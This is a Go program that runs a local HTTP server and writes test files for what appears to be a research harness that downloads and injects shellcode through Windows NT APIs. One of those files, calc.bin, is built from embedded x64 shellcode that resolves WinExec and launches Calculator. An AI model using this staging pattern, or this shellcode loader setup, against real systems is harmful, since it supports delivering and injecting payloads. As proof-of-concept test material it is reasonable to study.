package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
)

func main() {
	// Create test files
	createTestFiles()
	
	// Serve files from testfiles directory
	fs := http.FileServer(http.Dir("../testfiles"))
	http.Handle("/", fs)

	fmt.Println("[+] Starting HTTP server on :8080")
	fmt.Println("[+] Serving files from testfiles/")
	fmt.Println("[+] Available files:")
	fmt.Println("    http://localhost:8080/test.txt")
	fmt.Println("    http://localhost:8080/calc.bin")
	fmt.Println()

	log.Fatal(http.ListenAndServe(":8080", nil))
} 

func createTestFiles() {
	// Ensure testfiles directory exists
	os.MkdirAll("../testfiles", 0755)
	
	// Create test.txt
	testContent := `hello from the NT Socket test server!

this file demonstrates downloading content using windows NT APIs.

[+] socket creation with AFD endpoints
[+] DNS resolution via UDP
[+] HTTP requests  
[+] file operations with NtWriteFile
[+] shellcode injection with heap allocation

test successful!`
	
	err := os.WriteFile("../testfiles/test.txt", []byte(testContent), 0644)
	if err != nil {
		log.Printf("Warning: could not create test.txt: %v", err)
	}
	
	// Create calc.bin using embedded shellcode
	shellcode := getEmbeddedShellcode()
	err = os.WriteFile("../testfiles/calc.bin", shellcode, 0644)
	if err != nil {
		log.Printf("Warning: could not create calc.bin: %v", err)
	}
	
	fmt.Printf("[+] Created test files: test.txt (%d bytes), calc.bin (%d bytes)\n", 
		len(testContent), len(shellcode))
}

func getEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
	
	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}